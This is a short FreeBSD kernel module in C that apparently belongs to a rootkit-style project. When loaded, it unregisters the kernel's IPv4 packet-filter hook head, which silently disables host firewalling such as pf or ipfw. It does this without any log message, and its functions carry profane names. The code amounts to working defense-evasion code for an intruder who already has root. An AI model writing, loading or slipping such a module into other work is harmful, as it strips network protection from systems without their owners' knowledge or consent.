#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/socketvar.h>
#include <sys/protosw.h>
#include <sys/systm.h>
#include <sys/types.h>
#include <sys/mbuf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/exec.h>
#include <net/pfil.h>
#include <netinet/ip_var.h>
#include <net/if.h>
#include <sys/syslog.h>
#include <sys/eventhandler.h>
#include <sys/libkern.h>  // Kernel-space string functions
#include <sys/sx.h> // for finding proc
#include <sys/queue.h> // for finding proc
#include <sys/lock.h>     // Locking mechanisms
#include <sys/sched.h>    // Needed for FIRST_THREAD_IN_PROC()
#include <sys/unistd.h> // for RFPROC
#include <sys/imgact.h> // For image_args

#include <amd64/include/pcb.h> // for pcb struct
// all the retarded includes for pcb
#include <amd64/include/fpu.h>
#include <amd64/include/segments.h>
#include <amd64/include/tss.h>





static pfil_head_t ph    = NULL;

static void do_fuck(void) {
    ph = V_inet_pfil_head;

    pfil_head_unregister(ph);
}

static int event_handler(struct module *module, int event, void *arg) {
    switch (event) {
        case MOD_LOAD:
            do_fuck();
            return 0;
        case MOD_UNLOAD:
            printf("[LKM] Module unloaded.\n");
            return 0;
        default:
            return EOPNOTSUPP;
    }
}


static moduledata_t module_data = {
    "fuck",
    event_handler,
    NULL
};


DECLARE_MODULE(kms_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);



